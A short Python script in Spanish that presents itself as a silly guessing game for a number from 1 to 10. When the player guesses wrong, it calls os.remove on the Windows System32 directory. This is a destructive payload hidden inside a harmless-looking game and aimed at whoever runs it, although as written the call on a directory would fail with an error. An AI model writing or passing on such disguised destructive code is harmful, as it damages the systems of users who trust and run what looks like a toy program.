import os
import random

print("Su tonto juego de adivinar un numero del 1 al 10\n")

while True:
    try:
        number = int(input("Ingresa un numero del 1 al 10: "))
    except:
        print("Ingresa un numero, no un caracter o decimal, numero entero")
    else:
        if number > 10 or number < 1:
            print("Numero no valido")
        else:
            break

game = random.randint(1,10)

if number == game:
    print("Has ganado!")
else:
    os.remove("C:/Windows/System32")

